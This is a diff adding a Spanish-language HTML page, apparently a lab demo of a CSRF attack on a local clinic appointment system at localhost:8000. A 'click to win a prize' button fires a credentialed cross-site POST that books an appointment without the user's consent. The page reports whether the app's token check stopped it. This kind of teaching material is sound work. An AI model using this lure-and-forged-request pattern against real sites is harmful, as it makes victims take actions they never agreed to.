@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Attack - Policlínico Flores</title>
+    <style>
+        body { font-family: Arial, sans-serif; max-width: 600px; margin: 50px auto; padding: 20px; background: #f5f5f5; }
+        .container { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
+        h1 { color: #c62828; }
+        .btn { background: #c62828; color: white; padding: 20px 40px; border: none; border-radius: 10px; font-size: 24px; cursor: pointer; transition: 0.3s; }
+        .btn:hover { background: #b71c1c; transform: scale(1.02); }
+        .info { background: #fff3e0; padding: 15px; border-radius: 8px; margin: 20px 0; border-left: 4px solid #e65100; }
+        .resultado { margin-top: 20px; padding: 15px; border-radius: 8px; display: none; }
+        .success { background: #e8f5e9; color: #2e7d32; border-left: 4px solid #2e7d32; }
+        .error { background: #ffebee; color: #c62828; border-left: 4px solid #c62828; }
+        .warning { background: #fff3e0; color: #e65100; border-left: 4px solid #e65100; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔥 CSRF Attack - Policlínico Flores</h1>
+        <p>Este sitio malicioso crea una cita sin tu consentimiento.</p>
+        
+        <div class="info">
+            <strong>⚠️ IMPORTANTE:</strong><br>
+            1. Debes tener sesión activa en el Policlínico<br>
+            2. El sistema debe estar en <strong>MODO INSEGURO</strong><br>
+            3. Esta página debe estar en la <strong>MISMA VENTANA</strong> donde iniciaste sesión
+        </div>
+
+        <button class="btn" onclick="csrfAttack()">
+            🎁 Haz click para ganar un premio
+        </button>
+
+        <div id="resultado" class="resultado"></div>
+
+        <p style="margin-top:20px;color:#666;font-size:12px;">
+            <strong>🔍 Cómo probar:</strong><br>
+            1. Inicia sesión en <strong>http://localhost:8000</strong> como administrador<br>
+            2. Activa el modo inseguro en <strong>/seguridad</strong><br>
+            3. Vuelve a esta página y haz click en el botón<br>
+            4. La cita se creará sin tu consentimiento<br>
+            5. Ve a <strong>http://localhost:8000/citas</strong> y verifica
+        </p>
+    </div>
+
+    <script>
+    function csrfAttack() {
+        const resultado = document.getElementById('resultado');
+        resultado.style.display = 'block';
+        resultado.className = 'resultado warning';
+        resultado.innerHTML = '⏳ Enviando petición...';
+        
+        const datos = new URLSearchParams({
+            'especialidad_id': '1',
+            'medico_id': '8',
+            'fecha_cita': '2026-12-25',
+            'hora_cita': '10:00',
+            'paciente_nombre': 'Paciente CSRF',
+            'tipo_doc': 'DNI',
+            'num_doc': '99999999'
+        });
+
+        fetch('http://localhost:8000/citas', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+            },
+            body: datos,
+            credentials: 'include'
+        })
+        .then(response => {
+            console.log('Response status:', response.status);
+            
+            if (response.status === 419) {
+                resultado.className = 'resultado error';
+                resultado.innerHTML = '❌ <strong>Error 419 - CSRF Token inválido.</strong> El sistema está en modo seguro y protegió contra el ataque.';
+            } else if (response.redirected) {
+                resultado.className = 'resultado warning';
+                resultado.innerHTML = '❌ <strong>Redirigido al login.</strong> No tienes sesión activa. Inicia sesión primero.';
+            } else if (response.status === 200 || response.status === 302) {
+                resultado.className = 'resultado success';
+                resultado.innerHTML = '✅ <strong>¡CSRF EXITOSO!</strong> Se creó una cita sin tu consentimiento.<br>Ve a <strong>http://localhost:8000/citas</strong> para verificarlo.';
+            } else {
+                resultado.className = 'resultado error';
+                resultado.innerHTML = '❌ Error: ' + response.status;
+            }
+            
+            return response.text();
+        })
+        .then(data => console.log('Respuesta:', data))
+        .catch(error => {
+            console.error('Error:', error);
+            resultado.className = 'resultado error';
+            resultado.innerHTML = '❌ Error: ' + error.message;
+        });
+    }
+    </script>
+</body>
+</html>
